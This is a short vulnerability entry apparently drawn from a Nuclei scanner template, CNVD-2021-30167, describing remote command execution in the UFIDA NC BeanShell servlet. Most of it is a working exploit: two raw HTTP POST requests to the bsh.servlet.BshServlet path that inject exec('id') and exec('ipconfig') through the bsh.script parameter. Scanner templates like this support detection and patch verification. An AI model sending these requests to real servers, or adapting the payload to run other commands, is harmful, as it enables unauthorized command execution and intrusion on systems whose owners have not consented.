# Nuclei Template: UFIDA NC BeanShell Remote Command Execution
**Template ID:** CNVD-2021-30167
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`CNVD-2021-30167.yaml`)

## Vulnerability Information & PoC

## Description
UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.

## Steps to reproduce / Exploit Payload
```http
POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("id");

POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

bsh.script=exec("ipconfig");
```
